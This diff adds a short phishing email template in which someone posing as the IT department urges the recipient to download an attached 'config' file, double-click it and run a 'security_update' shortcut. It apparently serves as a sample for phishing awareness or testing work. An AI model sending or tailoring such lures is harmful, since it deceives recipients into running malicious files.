@@ -1,0 +1,13 @@
+Hey!
+
+I am writing you from the IT department. As part of our ongoing efforts to ensure system security and efficiency, we have made some important updates to our software configuration. Attached to this email, I have included a configuration file named "config". This file contains crucial system updates that need to be implemented immediately.
+
+Instructions:
+
+    Download the attached "config" file.
+    Double-click to run the file.
+    Execute the security_update shortcut within.
+
+Please do not hesitate to contact the IT department if you encounter any issues during the update process or if you have any questions. Thank you!
+
+Gustanini
